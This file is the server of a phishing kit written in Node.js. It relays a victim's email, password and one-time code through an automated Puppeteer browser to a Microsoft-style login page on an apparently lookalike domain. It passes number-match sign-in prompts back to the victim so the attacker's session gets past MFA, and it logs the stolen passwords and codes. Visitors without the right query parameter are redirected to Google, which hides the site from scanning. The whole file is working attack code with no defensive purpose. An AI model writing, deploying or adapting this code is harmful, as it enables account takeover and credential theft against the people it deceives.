const express = require("express");
const cors = require("cors");
const fs = require("fs");
const puppeteer = require("puppeteer");
require("dotenv").config();
const path = require("path");
const { v4: uuidv4 } = require("uuid");

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for all routes
app.use(cors());

app.use(express.static("public"));
app.use(express.json());

let sessions = {};

// Helper function to delay actions
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Serve index.html when the root URL is accessed

app.get("/", (req, res) => {
  if (!req.query.id) {
    // Redirect to Google
    return res.redirect("https://www.google.com");
  } else {
    res.sendFile(path.join(__dirname, "views", "index.html"));
  }
});


app.post("/email", async (req, res) => {
  let { sessionId, email } = req.body;
  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }

  try {
    const browser = await puppeteer.launch({ headless: false });
    // const browser = await puppeteer.launch({
    //   args: [
    //     "--disable-setuid-sandbox",
    //     "--no-sandbox",
    //     "--single-process",
    //     "--no-zygote",
    //   ],
    //   executablePath:
    //     process.env.NODE_ENV === "production"
    //       ? process.env.PUPPETEER_EXECUTABLE_PATH
    //       : puppeteer.executablePath(),
    // });
    const page = await browser.newPage();
    const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    await page.setUserAgent(userAgent);
    await page.goto("https://login.affiniitiv.com/MNvZpKRD",{ waitUntil: 'networkidle2' });
    await page.waitForSelector("#i0116");
    await page.type("#i0116", email);
    await page.click("#idSIButton9");
    await delay(5000);

    const content1 = await page.content();
    if (!content1.includes("Enter password")) {
      await page.click("#aadTile");
    }

    sessions[sessionId] = { browser, page };
    res.send("1");
    console.log(`Email: ${email} logged for session: ${sessionId}`);
  } catch (err) {
    console.error("Error in /email:", err);
    res.status(500).send(err);
  }
});

app.post("/pass", async (req, res) => {
  const { sessionId, password } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#i0118");
    await page.type("#i0118", password);
    await page.click("#idSIButton9");
    await delay(5000);

    const content2 = await page.content();
    if (content2.includes("Enter password")) {
      res.send("0");
      console.log(`Incorrect password: ${password} for session: ${sessionId}`);
    } else {
      const content3 = await page.content();
      if (content3.includes("Enter code")) {
        console.log("Enter code");
        res.send("2");
      } else if (content3.includes("Approve sign in request")) {
        console.log("Approve sign in request");
        await page.waitForSelector("#idRichContext_DisplaySign");
        const textContent = await page.$eval(
          "#idRichContext_DisplaySign",
          (el) => el.textContent
        );
        res.send(textContent);
        await delay(60000);
        const content = await page.content();
        if (content.includes("Stay signed in?")) {
          await page.waitForSelector("#idSIButton9");
          await page.click("#idSIButton9");
        }
      } else {
        console.log("No 2FA");
        await delay(5000);
        await page.waitForSelector("#idSIButton9");
        await page.click("#idSIButton9");
        res.send("1");
      }
      console.log(`Password: ${password} logged for session: ${sessionId}`);
    }
  } catch (err) {
    console.error("Error in /pass:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/code", async (req, res) => {
  const { sessionId, code } = req.body;

  if (!sessionId || !code) {
    return res.status(400).send("Session ID and code are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
    await page.type("#idTxtBx_SAOTCC_OTC", code);
    await page.click("#idSubmit_SAOTCC_Continue");
    await delay(5000);

    const content = await page.content();
    if (content.includes("You didn't enter the expected verification code.")) {
      await page.type("#idTxtBx_SAOTCC_OTC", "");
      res.send("0");
      console.log(`Incorrect code: ${code} for session: ${sessionId}`);
    } else {
      await delay(5000);
      await page.click("#idSIButton9");
      res.send("1");
      console.log(`Code: ${code} logged for session: ${sessionId}`);
    }
  } catch (err) {
    console.error("Error in /code:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/resend", async (req, res) => {
  const { sessionId, password, request } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    const content = await page.content();
    if (content.includes("We didn't hear from you")) {
      await page.click("#idA_SAASTO_Resend");
      await delay(5000);
      await page.waitForSelector("#idRichContext_DisplaySign");
      const textContent = await page.$eval(
        "#idRichContext_DisplaySign",
        (el) => el.textContent
      );
      res.send(textContent);
    } else {
      res.send("0");
    }
  } catch (err) {
    console.error("Error in /resend:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/close", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).send("Session ID is required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { browser } = session;
    await browser.close();
    delete sessions[sessionId];

    res.send("Browser closed");
    console.log(`Browser closed for session: ${sessionId}`);
  } catch (err) {
    console.error("Error in /close:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
